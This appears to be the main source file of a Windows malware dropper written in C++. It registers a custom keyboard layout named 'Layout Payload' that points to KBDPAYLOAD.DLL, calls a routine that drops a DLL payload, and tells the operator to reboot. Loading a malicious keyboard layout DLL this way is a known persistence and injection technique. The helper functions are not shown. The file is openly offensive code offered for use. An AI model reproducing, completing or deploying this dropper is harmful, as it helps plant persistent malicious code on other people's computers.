#include "defs.h"
#include "install.hpp"
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")


int32_t main(void)
{
	PLAYOUTID layoutID = new LayoutID({ L"Layout Payload", L"00CE", L"@%SystemRoot%\\system32\\input.dll,-5000", L"KBDPAYLOAD.DLL", L""});
	if (Install::InstallCustomLayout(layoutID))
	{
#ifdef _DEBUG
		std::cout << "Parsed all layouts, lets see the results.\n";
		std::printf("Layout ID: 0x%x\n", layoutID->m_maxLayoutId);
#endif 
	}
	delete layoutID;

	if (Dropper::DropDllPayload())
	{
		std::printf("Dropped dll payload successfully, now reboot!\n");
	}

	//Pause to read output.
	system("PAUSE");

	return EXIT_SUCCESS;
}
